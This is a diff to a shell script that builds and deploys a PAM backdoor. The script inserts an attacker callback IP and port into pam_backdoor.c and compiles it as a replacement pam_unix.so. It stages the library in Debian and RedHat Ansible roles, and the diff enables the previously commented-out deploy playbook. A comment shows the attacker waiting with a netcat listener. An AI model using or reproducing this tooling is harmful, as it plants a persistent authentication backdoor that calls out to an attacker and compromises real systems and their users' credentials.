@@ -29,7 +29,7 @@ sed -i "s/^ansible_password.*/ansible_password=$pass/" ./inventory.ini
 sed -i "s/^ansible_become_password.*/ansible_become_password=$pass/" ./inventory.ini
 
 # Install prereqs using ansible
-# ansible-playbook main.yml -t local
+ansible-playbook main.yml -t setup
 
 # Change pam_backdoor.c to match callback IP and Port
 sed -i "s/^#define CALLBACK_IP.*/#define CALLBACK_IP \"$ip\"/" ./pam_backdoor.c
@@ -42,17 +42,14 @@ sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT $port/" ./pam_backdoor.
 # -l***: Link libpam.so and libdl.so
 gcc -fPIC -shared -o pam_unix.so pam_backdoor.c -lpam -ldl
 
+# Copy files for use by ansible
+cp ./pam_unix.so ./roles/deploy_debian/files/
+cp ./pam_unix.so ./roles/deploy_redhat/files/
+
 # Run ansible playbook to setup
-# ansible-playbook main.yml -t 
+ansible-playbook main.yml -t deploy
 
 # attacker runs nc -nlvk <port>
-
-# # Backup old pam_unix.so
-# cp /lib/x86_64-linux-gnu/security/pam_unix.so /lib/pam.d/pam_unix.so
-
-# # Copy over new pam_unix.so
-# if [[ $version_number -eq 1 ]]; then
-#     cp 
 
     
     
